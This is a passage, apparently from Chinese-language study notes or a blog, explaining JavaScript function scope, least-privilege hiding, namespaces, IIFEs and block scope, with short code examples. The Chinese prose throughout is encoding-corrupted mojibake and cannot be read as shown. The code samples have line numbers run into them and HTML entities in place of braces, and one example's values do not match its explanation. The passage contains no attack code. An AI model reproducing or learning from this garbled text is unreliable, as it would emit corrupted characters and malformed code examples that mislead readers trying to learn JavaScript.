ç‰‡æ®µçš„å‘¨å›´åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ®µä»£ç ä¸­çš„ä»»ä½•å£°æ˜Ž ï¼ˆå˜é‡æˆ–è€…å‡½æ•°ï¼‰éƒ½å°†ç»‘å®šåœ¨è¿™ä¸ªæ–°åˆ›å»ºçš„åŒ…è£…çš„å‡½æ•°çš„ä½œç”¨åŸŸä¸­ï¼Œè€Œä¸æ˜¯å…ˆå‰æ‰€åœ¨çš„ä½œç”¨åŸŸä¸­ã€‚æ¢å¥è¯è¯´ï¼Œå¯ä»¥æŠŠå˜é‡å’Œå‡½æ•°åŒ…è£¹åœ¨ä¸€ä¸ªå‡½æ•°çš„ä½œç”¨åŸŸä¸­ï¼Œç„¶åŽç”¨è¿™ä¸ªä½œç”¨åŸŸæ¥â€œéšè—â€å®ƒä»¬ã€‚ æœ‰å¾ˆå¤šåŽŸå› ä¿ƒæˆäº†è¿™ç§åŸºäºŽä½œç”¨åŸŸçš„éšè—æ–¹æ³•ã€‚å®ƒä»¬å¤§éƒ½æ˜¯ä»Žæœ€å°ç‰¹æƒåŽŸåˆ™ä¸­å¼•ç”³å‡ºæ¥çš„ï¼Œä¹Ÿå«åšæœ€å°æŽˆæƒæˆ–æœ€å°æš´éœ²åŽŸåˆ™ã€‚è¿™ä¸ªåŽŸåˆ™æ˜¯æŒ‡åœ¨è½¯ä»¶è®¾è®¡ä¸­ï¼Œåº”è¯¥æœ€å°é™åº¦åœ°æš´éœ²å¿…è¦å†…å®¹ï¼Œè€Œå°†å…¶ä»–å†…å®¹éƒ½â€œéšè—â€èµ·æ¥ï¼Œæ¯”å¦‚æŸä¸ªæ¨¡å—æˆ–å¯¹è±¡çš„ API è®¾è®¡ã€‚è¿™ä¸ªåŽŸåˆ™å¯ä»¥å»¶ä¼¸åˆ°å¦‚ä½•é€‰æ‹©ä½œç”¨åŸŸæ¥åŒ…å«å˜é‡å’Œå‡½æ•°ã€‚å¦‚æžœæ‰€æœ‰å˜é‡å’Œå‡½æ•°éƒ½åœ¨å…¨å±€ä½œç”¨åŸŸä¸­ï¼Œå½“ç„¶å¯ä»¥åœ¨æ‰€æœ‰çš„å†…å®¹åµŒå¥—ä½œç”¨åŸŸä¸­è®¿é—®å®ƒä»¬ã€‚ä½†è¿™æ ·ä¼šç ´åå‰é¢æåˆ°çš„æœ€å°ç‰¹æƒåŽŸåˆ™ï¼Œå› ä¸ºå¯èƒ½ä¼šæš´éœ²è¿‡å¤šçš„å˜é‡æˆ–å‡½æ•°ï¼Œè€Œè¿™äº›å˜é‡æˆ–å‡½æ•°æœ¬æ¥åº”è¯¥æ˜¯ç§æœ‰çš„ï¼Œæ­£ç¡®çš„ä»£ç åº”è¯¥æ˜¯å¯ä»¥é˜»æ­¢è¿™äº›å˜é‡æˆ–å‡½æ•°è¿›è¡Œè®¿é—®çš„ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345678910function doSomething(a)&#123; b = a + doSomethingElse(a * 2); console.log(b * 3);&#125;function doSomethingElse(a)&#123; return a - 1;&#125;var b;doSomething(2); //15 ä¸Šé¢çš„ä¾‹å­ï¼Œå˜é‡ b å’Œå‡½æ•° doSomethingElse(â€¦)åº”è¯¥æ˜¯ doSomething(â€¦)å†…éƒ¨å…·ä½“å®žçŽ°çš„â€œç§æœ‰â€œå†…å®¹ã€‚ç»™äºˆå¤–éƒ¨ä½œç”¨åŸŸ å¯¹ b å’Œ doSomethingElse(â€¦)çš„â€è®¿é—®æƒé™â€œä¸ä»…æ²¡æœ‰å¿…è¦ï¼Œè€Œä¸”è¿˜æ˜¯å±é™©çš„ã€‚å› ä¸ºå®ƒä»¬å¯èƒ½ä¼šè¢«æœ‰æ„æˆ–è€…æ˜¯æ— æ„ä»¥éžé¢„æœŸçš„æ–¹å¼ä½¿ç”¨ï¼Œä»Žè€Œå¯¼è‡´äº†è¶…å‡ºäº† doSomething(â€¦)çš„é€‚ç”¨æ¡ä»¶ã€‚æ›´â€åˆç†â€œçš„è®¾è®¡ä¼šå°†è¿™äº›ç§æœ‰çš„å…·ä½“çš„å†…å®¹éšè—åœ¨ doSomething(â€¦)å†…å®¹ã€‚ä¾‹å¦‚ï¼š 123456789function doSomething(a)&#123; function doSomethingElse(a)&#123; return a - 1; &#125; var b; b = a + doSomethingElse(a * 2); console.log(b *3);&#125;doSomething(2); // 15 çŽ°åœ¨ï¼Œb å’Œ doSomethingElse(â€¦)éƒ½æ— æ³•ä»Žå¤–éƒ¨è¢«è®¿é—®äº†ï¼Œè€Œåªèƒ½è¢« doSomething(â€¦)æ‰€æŽ§åˆ¶ã€‚åŠŸèƒ½æ€§å’Œæœ€ç»ˆæ•ˆæžœéƒ½æ²¡æœ‰å—åˆ°å½±å“ï¼Œä½†æ˜¯è®¾è®¡ä¸Šå°†å…·ä½“å†…å®¹ç§æœ‰åŒ–äº†ï¼Œè®¾è®¡è‰¯å¥½çš„è½¯ä»¶éƒ½ä¼šä¾æ­¤è¿›è¡Œå®žçŽ°ã€‚ è§„é¿å†²çªâ€œéšè—â€œä½œç”¨åŸŸä¸­çš„å˜é‡å’Œå‡½æ•°æ‰€å¸¦æ¥çš„å¦ä¸€ä¸ªå¥½å¤„ï¼Œæ˜¯å¯ä»¥é¿å…åŒåæ ‡è¯†ç¬¦ä¹‹é—´çš„å†²çªï¼Œä¸¤ä¸ªæ ‡è¯†ç¬¦å¯èƒ½å…·æœ‰åŒæ ·çš„åå­—ä½†ç”¨é€”å´ä¸ä¸€æ ·ï¼Œæ— æ„é—´å¯èƒ½ä¼šé€ æˆåŒåå†²çªï¼Œå†²çªä¼šå¯¼è‡´å˜é‡çš„å€¼è¢«æ„å¤–è¦†ç›–ã€‚ 1234567891011function foo()&#123; function bar(a)&#123; i = 3; // ä¿®æ”¹ for å¾ªçŽ¯æ‰€å±žçš„ä½œç”¨åŸŸä¸­çš„ i console.log(a + i); &#125; for(var i = 0; i &lt; 10; i++)&#123; bar(i * 2); // æ§½ç³•ï¼Œæ— é™å¾ªçŽ¯äº† &#125;&#125;foo();// bar(...)å†…éƒ¨çš„å¤åˆ¶è¡¨è¾¾å¼ i = 3 æ„å¤–åœ°è¦†ç›–å£°æ˜Žåœ¨ foo(...)å†…éƒ¨ for å¾ªçŽ¯çš„i.è¿™ä¸ªä¾‹å­å°†ä¼šå¯¼è‡´æ— é™å¾ªçŽ¯ï¼Œå› ä¸ºi è¢«å›ºå®šè®¾ç½®ä¸º3ï¼Œæ°¸è¿œä¸ä¼šæ»¡è¶³å°äºŽ10è¿™ä¸ªæ¡ä»¶ã€‚ bar(â€¦)å†…éƒ¨çš„èµ‹å€¼æ“ä½œéœ€è¦å£°æ˜Žä¸€ä¸ªæœ¬åœ°å˜é‡æ¥ä½¿ç”¨ï¼Œé‡‡ç”¨ä»»ä½•åå­—éƒ½å¯ä»¥ï¼Œvar i = 3;å°±å¯ä»¥æ»¡è¶³è¿™ä¸ªéœ€æ±‚ï¼ˆåŒæ—¶ä¼šä¸º i å£°æ˜Žä¸€ä¸ªå‰é¢æåˆ°çš„â€œé®è”½å˜é‡â€ï¼‰ã€‚å¦å¤–ä¸€ç§æ–¹æ³•æ˜¯é‡‡ç”¨ä¸€ä¸ªå®Œå…¨ä¸åŒçš„æ ‡è¯†ç¬¦åç§°ï¼Œæ¯”å¦‚ï¼švar j = 3ã€‚ä½†æ˜¯è½¯ä»¶è®¾è®¡å†æŸç§æƒ…å†µä¸‹å¯èƒ½è‡ªç„¶è€Œç„¶è¦æ±‚ä½¿ç”¨åŒæ ·çš„æ ‡è¯†ç¬¦åç§°ï¼Œå› æ­¤åœ¨è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨ä½œç”¨åŸŸæ¥â€œéšè—â€å†…éƒ¨å£°æ˜Žæ˜¯å”¯ä¸€çš„æœ€ä½³é€‰æ‹©ã€‚ 1.å…¨å±€å‘½åç©ºé—´ å˜é‡å†²çªçš„ä¸€ä¸ªå…¸åž‹ä¾‹å­å­˜åœ¨äºŽå…¨å±€ä½œç”¨åŸŸä¸­ã€‚å½“ç¨‹åºä¸­åŠ è½½äº†å¤šä¸ªç¬¬ä¸‰æ–¹åº“æ—¶ï¼Œå¦‚æžœå®ƒä»¬æ²¡æœ‰å¦¥å–„åœ°å°†å†…éƒ¨ç§æœ‰çš„å‡½æ•°æˆ–è€…å˜é‡éšè—èµ·æ¥ï¼Œå°±ä¼šå¾ˆå®¹æ˜“å¼•èµ·å†²çªã€‚ è¿™äº›åº“é€šå¸¸ä¼šåœ¨å…¨å±€ä½œç”¨åŸŸä¸­å£°æ˜Žä¸€ä¸ªåå­—è¶³å¤Ÿç‹¬ç‰¹çš„å˜é‡ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡è¢«ç”¨ä½œåº“çš„å‘½åç©ºé—´ï¼Œæ‰€æœ‰éœ€è¦æš´éœ²ç»™å¤–ç•Œçš„åŠŸèƒ½éƒ½ä¼šæˆä¸ºè¿™ä¸ªå¯¹è±¡ï¼ˆå‘½åç©ºé—´ï¼‰çš„å±žæ€§ï¼Œè€Œä¸æ˜¯å°†è‡ªå·±çš„æ ‡è¯†ç¬¦æš´éœ²åœ¨é¡¶çº§çš„è¯æ³•ä½œç”¨åŸŸä¸­ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š 123456789var MyReallyCoolLibrary = &#123; awesome:"stuff", doSomething:function()&#123; //.. &#125;, doAnotherThing:function()&#123; //.. &#125;&#125; 2.æ¨¡å—ç®¡ç† å¦å¤–ä¸€ç§è§„é¿å†²çªçš„åŠžæ³•å’ŒçŽ°ä»£çš„æ¨¡å—æœºåˆ¶å¾ˆæŽ¥è¿‘ã€‚å°±æ˜¯ä»Žä¼—å¤šçš„æ¨¡å—ç®¡ç†å™¨ä¸­æŒ‘é€‰ä¸€ä¸ªæ¥ä½¿ç”¨ã€‚ä½¿ç”¨è¿™äº›å·¥å…·ï¼Œä»»ä½•åº“éƒ½æ— éœ€å°†æ ‡è¯†ç¬¦åŠ å…¥åˆ°å…¨å±€ä½œç”¨åŸŸä¸­ï¼Œè€Œæ˜¯é€šè¿‡ä¾èµ–ç®¡ç†å™¨çš„æœºåˆ¶å°†åº“çš„æ ‡è¯†ç¬¦æ˜¾å¼åœ°å¯¼å…¥åˆ°å¦å¤–ä¸€ä¸ªç‰¹å®šçš„ä½œç”¨åŸŸä¸­ã€‚è¿™äº›å·¥å…·æ²¡æœ‰èƒ½å¤Ÿè¿åè¯æ³•ä½œç”¨åŸŸè§„åˆ™çš„â€œç¥žå¥‡â€åŠŸèƒ½ã€‚å®ƒä»¬åªæ˜¯åˆ©ç”¨ä½œç”¨åŸŸçš„è§„åˆ™å¼ºåˆ¶æ‰€æœ‰æ ‡è¯†ç¬¦éƒ½ä¸èƒ½æ³¨å…¥å…±äº«ä½œç”¨åŸŸä¸­ï¼Œè€Œæ˜¯ä¿å­˜åœ¨ç§æœ‰ã€æ— å†²çªçš„ä½œç”¨åŸŸä¸­ï¼Œè¿™æ ·å¯ä»¥æœ‰æ•ˆè§„é¿æŽ‰æ‰€æœ‰çš„æ„å¤–å†²çªã€‚ å‡½æ•°ä½œç”¨åŸŸçŽ°åœ¨çŸ¥é“äº†åœ¨ä»»æ„ä»£ç ç‰‡æ®µå¤–éƒ¨æ·»åŠ åŒ…è£…å‡½æ•°ï¼Œå¯ä»¥å°†å†…éƒ¨çš„å˜é‡å’Œå‡½æ•°å®šä¹‰â€œéšè—â€èµ·æ¥ï¼Œå¤–éƒ¨ä½œç”¨åŸŸæ— æ³•è®¿é—®åŒ…è£…å‡½æ•°å†…éƒ¨çš„ä»»ä½•å†…å®¹ã€‚ ä¾‹å¦‚ï¼š 1234567var a = 2;function foo()&#123; var a = 3; console.log(a); &#125;foo(); // 3console.log(a); // 2 è™½ç„¶è¿™ç§æŠ€æœ¯å¯ä»¥è§£å†³ä¸€äº›é—®é¢˜ï¼Œä½†æ˜¯å®ƒå¹¶ä¸ç†æƒ³ï¼Œå› ä¸ºä¼šå¯¼è‡´ä¸€äº›é¢å¤–çš„é—®é¢˜ã€‚é¦–å…ˆï¼Œå¿…é¡»å£°æ˜Žä¸€ä¸ªå…·åå‡½æ•°fooï¼ˆï¼‰,æ„å‘³ç€foo è¿™ä¸ªåç§°æœ¬èº«æ±¡æŸ“äº†æ‰€åœ¨çš„ä½œç”¨åŸŸã€å…¶æ¬¡ï¼Œå¿…é¡»æ˜¾å¼åœ°é€šè¿‡å‡½æ•°åè°ƒç”¨æ‰å¯ä»¥è¿è¡Œé‡Œé¢çš„ä»£ç ã€‚ å¦‚æžœå‡½æ•°ä¸éœ€è¦å‡½æ•°åï¼ˆæˆ–è€…è‡³å°‘å‡½æ•°åå¯ä»¥ä¸æ±¡æŸ“æ‰€åœ¨çš„ä½œç”¨åŸŸï¼‰ï¼Œå¹¶èƒ½è‡ªåŠ¨è¿è¡Œï¼Œè¿™ä¼šæ›´åŠ ç†æƒ³ã€‚ 123456var a =2;(function foo()&#123; var a = 3; console.log(a);&#125;)()console.log(a); ä¸Šé¢çš„ä¾‹å­ï¼Œé¦–å…ˆï¼ŒåŒ…è£…å‡½æ•°çš„å£°æ˜Žä»¥ï¼ˆfunctionâ€¦ è€Œä¸ä»…æ˜¯ functionâ€¦å¼€å§‹ã€‚å‡½æ•°ä¼šè¢«å½“åšå‡½æ•°è¡¨è¾¾å¼è€Œä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„å‡½æ•°å£°æ˜Žæ¥å¤„ç†ã€‚ åŒºåˆ†å‡½æ•°å£°æ˜Žå’Œè¡¨è¾¾å¼æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯çœ‹ function å…³é”®å­—å‡ºçŽ°åœ¨å£°æ˜Žä¸­çš„ä½ç½®ï¼ˆä¸ä»…ä»…æ˜¯ä¸€è¡Œä»£ç ï¼Œè€Œæ˜¯æ•´ä¸ªå£°æ˜Žä¸­çš„ä½ç½®ï¼‰ã€‚å¦‚æžœ function æ˜¯å£°æ˜Žä¸­çš„ç¬¬ä¸€ä¸ªè¯ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸€ä¸ªå‡½æ•°å£°æ˜Žï¼Œå¦åˆ™å°±æ˜¯å‡½æ•°è¡¨è¾¾å¼ã€‚ å‡½æ•°å£°æ˜Žå’Œå‡½æ•°è¡¨è¾¾å¼ä¹‹é—´æœ€é‡è¦çš„åŒºåˆ«æ˜¯å®ƒä»¬çš„åç§°æ ‡è¯†ç¬¦å°†ä¼šç»‘å®šåœ¨ä½•å¤„ã€‚æ¯”è¾ƒä¸Šé¢é‚£ä¸ªä¾‹å­ï¼Œç¬¬ä¸€ä¸ªä¸­ foo è¢«ç»‘å®šåœ¨æ‰€åœ¨çš„ä½œç”¨åŸŸä¸­ï¼Œå¯ä»¥ç›´æŽ¥é€šè¿‡ fooæ¥è°ƒç”¨å®ƒã€‚ç¬¬äºŒä¸ªç‰‡æ®µä¸­ foo è¢«ç»‘å®šåœ¨å‡½æ•°è¡¨è¾¾å¼è‡ªèº«çš„å‡½æ•°ä¸­è€Œä¸æ˜¯åœ¨æ‰€åœ¨ä½œç”¨åŸŸä¸­ã€‚ æ¢å¥è¯è¯´ï¼Œï¼ˆfunction foo(){..}ï¼‰ ä½œä¸ºå‡½æ•°è¡¨è¾¾å¼æ„å‘³ç€ foo åªèƒ½åœ¨ .. æ‰€ä»£è¡¨çš„ä½ç½®ä¸­è¢«è®¿é—®ï¼Œå¤–éƒ¨ä½œç”¨åŸŸåˆ™ä¸è¡Œã€‚foo å˜é‡åè¢«éšè—åœ¨è‡ªèº«ä¸­æ„å‘³ç€ä¸ä¼šéžå¿…è¦åœ°æ±¡æŸ“å¤–éƒ¨ä½œç”¨åŸŸã€‚ åŒ¿åå’Œå…·åå¯¹äºŽå‡½æ•°è¡¨è¾¾å¼æœ€ç†Ÿæ‚‰çš„åœºæ™¯å°±æ˜¯å›žè°ƒå‡½æ•°äº† 123setTimeout(function()&#123; console.log('I waited 1 second!');&#125;,1000); è¿™å«åšåŒ¿åå‡½æ•°è¡¨è¾¾å¼ï¼Œå› ä¸º function()â€¦ æ²¡æœ‰åç§°æ ‡è¯†ç¬¦ã€‚å‡½æ•°è¡¨è¾¾å¼å¯ä»¥æ˜¯åŒ¿åçš„ï¼Œè€Œå‡½æ•°å£°æ˜Žåˆ™ä¸å¯ä»¥çœç•¥å‡½æ•°åâ€”â€”JavaScript ä¸­æ˜¯éžæ³•çš„ã€‚ åŒ¿åå‡½æ•°è¡¨è¾¾å¼ä¹¦å†™èµ·æ¥ç®€å•å¿«æ·ï¼Œå¾ˆå¤šåº“å’Œå·¥å…·ä¹Ÿå€¾å‘äºŽé¼“åŠ±ä½¿ç”¨è¿™ç§é£Žæ ¼çš„ä»£ç ï¼Œä½†æ˜¯å®ƒä¹Ÿæœ‰å‡ ä¸ªç¼ºç‚¹ï¼š åŒ¿åå‡½æ•°åœ¨æ ˆè¿½è¸ªä¸­ä¸ä¼šæ˜¾ç¤ºå‡ºæ„ä¹‰çš„å‡½æ•°åï¼Œä½¿å¾—è°ƒè¯•å¾ˆå›°éš¾ã€‚ å¦‚æžœæ²¡æœ‰å‡½æ•°åï¼Œå½“å‡½æ•°éœ€è¦å¼•ç”¨è‡ªèº«æ—¶åªèƒ½ä½¿ç”¨ä»¥åŠè¿‡æœŸçš„ arguments.callee å¼•ç”¨ï¼Œæ¯”å¦‚åœ¨é€’å½’ä¸­ã€‚å¦ä¸€ä¸ªå‡½æ•°éœ€è¦å¼•ç”¨è‡ªèº«çš„ä¾‹å­ï¼Œæ˜¯åœ¨äº‹ä»¶è§¦å‘åŽäº‹ä»¶ç›‘å¬å™¨éœ€è¦è§£ç»‘è‡ªèº«ã€‚ åŒ¿åå‡½æ•°çœç•¥äº†å¯¹ä»£ç å¯è¯»æ€§/å¯ç†è§£å¾ˆé‡è¦çš„å‡½æ•°åã€‚ä¸€ä¸ªæè¿°æ€§çš„åç§°å¯ä»¥è®©ä»£ç ä¸è¨€è‡ªæ˜Žã€‚ è¡Œä¸ºå‡½æ•°è¡¨è¾¾å¼éžå¸¸å¼ºå¤§ä¸”æœ‰ç”¨â€”â€”åŒ¿åå’Œå…·åä¹‹é—´çš„åŒºåˆ«å¹¶ä¸ä¼šå¯¹è¿™ç‚¹æœ‰ä»»ä½•å½±å“ã€‚ç»™å‡½æ•°è¡¨è¾¾å¼æŒ‡å®šä¸€ä¸ªå‡½æ•°åå¯ä»¥æœ‰æ•ˆè§£å†³ä»¥ä¸Šé—®é¢˜ã€‚å§‹ç»ˆç»™å‡½æ•°è¡¨è¾¾å¼å‘½åæ˜¯ä¸€ä¸ªæœ€ä½³å®žè·µï¼š 123setTimeout(function timeoutHandler()&#123; console.log('I waited 1 second!');&#125;,1000); ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼123456var a =2;(function foo()&#123; var a = 3; console.log(a);&#125;)()console.log(a); ç”±äºŽå‡½æ•°è¢«åŒ…å«åœ¨ä¸€å¯¹ï¼ˆï¼‰æ‹¬å·å†…éƒ¨ï¼Œå› æ­¤æˆä¸ºäº†ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œé€šè¿‡åœ¨æœ«å°¾åŠ ä¸Šå¦å¤–ä¸€ä¸ªï¼ˆï¼‰å¯ä»¥ç«‹å³æ‰§è¡Œå‡½æ•°ï¼Œæ¯”å¦‚ (function(){})() ã€‚ç¬¬ä¸€ä¸ªï¼ˆï¼‰å°†å‡½æ•°å˜æˆè¡¨è¾¾å¼ï¼Œç¬¬äºŒä¸ªï¼ˆï¼‰æ‰§è¡Œäº†è¿™ä¸ªå‡½æ•°ã€‚ è¿™ç§æ¨¡å¼å¾ˆå¸¸è§ï¼Œå‡ å¹´å‰ç¤¾åŒºç»™å®ƒå®šä¹‰äº†ä¸€ä¸ªæœ¯è¯­IIFEï¼Œä»£è¡¨ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼ï¼ˆImmediately Invoked Function Expressionï¼‰ å‡½æ•°åå¯¹ IFFE å½“ç„¶ä¸æ˜¯å¿…é¡»çš„ï¼ŒIFFE æœ€å¸¸è§çš„ç”¨æ³•æ˜¯ä½¿ç”¨ä¸€ä¸ªåŒ¿åå‡½æ•°è¡¨è¾¾å¼ã€‚è™½ç„¶ä½¿ç”¨å…·åå‡½æ•°çš„ IIFE å¹¶ä¸å¸¸è§ï¼Œä½†å®ƒå…·æœ‰ä¸Šè¿°åŒ¿åå‡½æ•°è¡¨è¾¾å¼æ‰€æœ‰çš„ä¼˜åŠ¿ï¼Œå› æ­¤ä¹Ÿæ˜¯ä¸€ä¸ªå€¼å¾—æŽ¨å¹¿çš„å®žè·µã€‚ 1234567var a =3;(function IIFE()&#123; var a = 3; console.log(a);&#125;)();console.log(a); ç›¸è¾ƒä¼ ç»Ÿçš„ IIFE å½¢å¼ï¼Œå¾ˆå¤šäººéƒ½æ›´å–œæ¬¢å¦ä¸€ä¸ªæ”¹è¿›çš„å½¢å¼ï¼š(function(){..}())ã€‚ä»”ç»†è§‚å¯Ÿå…¶ä¸­çš„åŒºåˆ«ï¼Œç¬¬ä¸€ç§å½¢å¼ä¸­å‡½æ•°è¡¨è¾¾å¼è¢«åŒ…å«åœ¨ï¼ˆï¼‰ä¸­ï¼Œç„¶åŽåœ¨åŽé¢ç”¨å¦ä¸€ä¸ªï¼ˆï¼‰æ‹¬å·æ¥è°ƒç”¨ã€‚ç¬¬äºŒç§å½¢å¼ä¸­ç”¨æ¥è°ƒç”¨çš„ï¼ˆï¼‰æ‹¬å·è¢«ç§»è¿›äº†ç”¨æ¥åŒ…è£…çš„ï¼ˆï¼‰æ‹¬å·ä¸­ã€‚ è¿™ä¸¤ç§å½¢å¼åœ¨åŠŸèƒ½ä¸Šæ˜¯ä¸€è‡´çš„ï¼Œé€‰æ‹©å“ªä¸ªå…¨å‡­ä¸ªäººå–œå¥½ IIFE çš„å¦ä¸€ä¸ªéžå¸¸æ™®éçš„è¿›é˜¶ç”¨æ³•æ˜¯æŠŠå®ƒä»¬å½“åšå‡½æ•°è°ƒç”¨å¹¶ä¼ é€’å‚æ•°è¿›åŽ»ã€‚ ä¾‹å¦‚ï¼š 1234567var a = 2;(function IIFE(global)&#123; var a = 3; console.log(a); // 3 console.log(global.a) // 2&#125;)(window)console.log(a); // 2 æˆ‘ä»¬å°† window å¯¹è±¡çš„å¼•ç”¨ä¼ é€’è¿›åŽ»ï¼Œä½†å°†å‚æ•°å‘½åä¸º globalï¼Œå› æ­¤åœ¨ä»£ç é£Žæ ¼ä¸Šå¯¹å…¨å±€å¯¹è±¡çš„å¼•ç”¨å˜å¾—æ¯”å¼•ç”¨ä¸€ä¸ªæ²¡æœ‰â€œå…¨å±€â€œå­—æ ·çš„å˜é‡æ›´åŠ æ¸…æ™°ã€‚å½“ç„¶å¯ä»¥ä»Žå¤–éƒ¨ä½œç”¨åŸŸä¼ é€’ä»»ä½•ä½ éœ€è¦çš„ä¸œè¥¿ï¼Œå¹¶å°†å˜é‡åå‘½åä¸ºä»»ä½•ä½ è§‰å¾—é€‚åˆçš„åå­—ã€‚è¿™å¯¹æ”¹è¿›ä»£ç é£Žæ ¼æ˜¯éžå¸¸æœ‰å¸®åŠ©çš„ã€‚ è¿™ä¸ªæ¨¡å¼çš„å¦ä¸€ä¸ªåº”ç”¨åœºæ™¯æ˜¯è§£å†³ undefined æ ‡è¯†ç¬¦çš„é»˜è®¤å€¼è¢«é”™è¯¯è¦†ç›–å¯¼è‡´çš„å¼‚å¸¸ï¼ˆè™½ç„¶ä¸å¸¸è§ï¼‰ã€‚è®²ä¸€ä¸ªå‚æ•°å‘½åä¸º undefined ï¼Œä½†æ˜¯åœ¨å¯¹åº”çš„ä½ç½®ä¸ä¼ å…¥ä»»ä½•å€¼ï¼Œè¿™æ ·å°±å¯ä»¥ä¿è¯åœ¨ä»£ç å—ä¸­ undefined æ ‡è¯†ç¬¦çš„å€¼çœŸçš„æ˜¯ undefinedã€‚ 1234567undefined = true; // ä¸è¦è¿™ä¹ˆåšï¼Œä¼šå¼•èµ·å¾ˆå¤šé—®é¢˜ï¼ˆfunction IIFEï¼ˆundefinedï¼‰&#123; var a; if(a === undefined)&#123; console.log('Undefined is safe here!'); &#125;&#125;ï¼‰() IIFE è¿˜æœ‰ä¸€ç§å˜åŒ–çš„ç”¨é€”æ˜¯å€’ç½®ä»£ç çš„è¿è¡Œé¡ºåºï¼Œå°†è¦è¿è¡Œçš„å‡½æ•°æ”¾åœ¨ç¬¬äºŒä½ï¼Œåœ¨ IIFE æ‰§è¡Œä¹‹åŽå½“åšå‚æ•°ä¼ é€’è¿›åŽ»ï¼Œè¿™ç§æ¨¡å¼åœ¨ UMD (universal Module Definition)é¡¹ç›®ä¸­è¢«å¹¿å‘ä½¿ç”¨ã€‚å°½ç®¡è¿™ç§æ¨¡å¼ç•¥æ˜¾å†—é•¿ï¼Œä½†æœ‰äº›äººè®¤ä¸ºå®ƒæ›´å®¹æ˜“è¢«ç†è§£ã€‚ 12345678var a = 2;(function IIFE(def)&#123; def(window)&#125;)(function def(global)&#123; var a = 3; console.log(a); // 3 console.log(global.a); // 2&#125;) å‡½æ•°è¡¨è¾¾å¼ def å®šä¹‰åœ¨ç‰‡æ®µçš„ç¬¬äºŒä¸ªç‰‡æ®µï¼Œç„¶åŽå½“ä½œå‚æ•°ï¼ˆè¿™ä¸ªå‚æ•°ä¹Ÿå«åš defï¼‰è¢«ä¼ é€’è¿› IIFEå‡½æ•°å®šä¹‰çš„ç¬¬ä¸€éƒ¨åˆ†ã€‚æœ€åŽï¼Œå‚æ•° def ï¼ˆä¹Ÿå°±æ˜¯ä¼ é€’è¿›åŽ»çš„å‡½æ•°ï¼‰è¢«è°ƒç”¨ï¼Œå¹¶å°† window ä¼ å…¥å½“å‰çš„ global å‚æ•°çš„å€¼ã€‚ å—ä½œç”¨åŸŸå°½ç®¡å‡½æ•°ä½œç”¨åŸŸæœ€å¸¸è§çš„ä½œç”¨åŸŸå•å…ƒï¼Œå½“ç„¶ä¹Ÿæ˜¯çŽ°è¡Œå¤§å¤šæ•° JavaScript ä¸­æœ€æ™®éçš„è®¾è®¡æ–¹æ³•ï¼Œä½†å…¶ä»–ç±»åž‹çš„ä½œç”¨åŸŸå•å…ƒä¹Ÿæ˜¯å­˜åœ¨çš„ï¼Œå¹¶ä¸”é€šè¿‡ä½¿ç”¨å…¶ä»–ç±»åž‹çš„ä½œç”¨åŸŸå•å…ƒç”šè‡³å¯ä»¥å®žçŽ°ç»´æŠ¤èµ·æ¥æ›´åŠ ä¼˜ç§€ã€ç®€æ´çš„ä»£ç ã€‚ 123for(var i = 0; i &lt; 10; i++)&#123; console.log(i);&#125; ä¸Šé¢ä¾‹å­ä¸­åœ¨ for å¾ªçŽ¯çš„å¤´éƒ¨ç›´æŽ¥å®šä¹‰äº† å˜é‡ i,é€šå¸¸æ˜¯å› ä¸ºåªæƒ³åœ¨ for å¾ªçŽ¯å†…éƒ¨çš„ä¸Šä¸‹æ–‡ä½¿ç”¨ i,è€Œå¿½ç•¥äº† i ä¼šè¢«ç»‘å®šåœ¨å¤–éƒ¨ä½œç”¨åŸŸï¼ˆå‡½æ•°æˆ–å…¨å±€ï¼‰ä¸­çš„äº‹å®žã€‚ è¿™ä¸ªå°±æ˜¯å—ä½œç”¨åŸŸçš„ä½œç”¨ï¼Œå˜é‡çš„å£°æ˜Žåº”è¯¥è·ç¦»ä½¿ç”¨çš„åœ°æ–¹è¶Šè¿‘è¶Šå¥½ï¼Œå¹¶æœ€å¤§é™åº¦åœ°æœ¬åœ°åŒ–ï¼Œå¦å¤–ä¸€ä¸ªä¾‹å­ï¼š 123456var foo = true;if(foo)&#123; var bar = foo * 2; bar = something(bar); console.log(bar);&#125; bar å˜é‡ä»…åœ¨ if å£°æ˜Žçš„ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ï¼Œå› ä¸ºå¦‚æžœèƒ½å°†å®ƒå£°æ˜Žåœ¨ if å—å†…éƒ¨ä¸­ä¼šæ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„ä¹‰çš„äº‹æƒ…ã€‚ä½†æ˜¯ï¼Œä½†æ˜¯ç”¨ var å˜é‡æ—¶ï¼Œå®ƒå†™åœ¨å“ªé‡Œéƒ½æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºå®ƒä»¬æœ€ç»ˆéƒ½ä¼šå±žäºŽå¤–éƒ¨ä½œç”¨åŸŸã€‚è¿™æ®µä»£ç æ˜¯ä¸ºäº†é£Žæ ¼æ›´æ˜“è¯»è€Œä¼ªè£…å‡ºçš„å½¢å¼ä¸Šçš„å—ä½œç”¨åŸŸï¼Œå¦‚æžœä½¿ç”¨è¿™å½¢å¼ï¼Œè¦ç¡®ä¿æ²¡åœ¨ä½œç”¨åŸŸå…¶ä»–åœ°æ–¹æ„å¤–åœ°ä½¿ç”¨ bar åªèƒ½ä¾é è‡ªè§‰æ€§ã€‚å—ä½œç”¨åŸŸæ˜¯ä¸€ä¸ªç”¨æ¥å¯¹ä¹‹å‰çš„æœ€å°æŽˆæƒåŽŸåˆ™è¿›è¡Œæ‰©å±•çš„å·¥å…·ï¼Œå°†ä»£ç ä»Žåœ¨å‡½æ•°ä¸­éšè—ä¿¡æ¯æ‰©å±•ä¸ºåœ¨å—ä¸­éšè—ä¿¡æ¯ã€‚å†æ¬¡æ€è€ƒä¸‹é¢çš„ä¾‹å­ï¼š 123for(var i = 0; i &lt; 10; 